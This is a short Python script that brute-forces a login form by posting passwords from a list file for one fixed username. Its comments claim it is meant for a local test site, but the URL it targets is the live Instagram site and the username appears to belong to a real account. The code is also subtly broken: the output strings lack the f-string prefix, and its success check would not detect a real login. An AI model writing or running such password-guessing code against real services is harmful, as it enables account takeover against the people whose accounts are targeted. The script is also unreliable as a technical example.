import requests

# URL of the login page (use a locally hosted testing site)
url = "https://www.instagram.com/"

# Path to the file containing potential passwords
password_file = "passwords.txt"

# Test username (ensure this is part of your controlled setup)
username = "areebayaseen503"

# Function to simulate a brute-force attempt
def brute_force_login():
    try:
        with open(password_file, "r") as file:
            for password in file:
                password = password.strip()  # Remove any extra whitespace
                # Send a POST request with username and password
                response = requests.post(url, data={"username": username, "password": password})
                
                # Check if login was successful
                if response.status_code == 200 and "Welcome" in response.text:
                    print("Login successful! Username: {username}, Password: {password}")
                    break
                else:
                    print("Attempt failed: {password}")
            else:
                print("No valid password found in the file.")
    except FileNotFoundError:
        print("Password file '{password_file}' not found.")
    except requests.ConnectionError:
        print("Failed to connect to the server. Ensure it's running locally.")
    except Exception as e:
        print("An error occurred: {e}")

# Run the brute-force simulation
if __name__ == "__main__":
    brute_force_login()
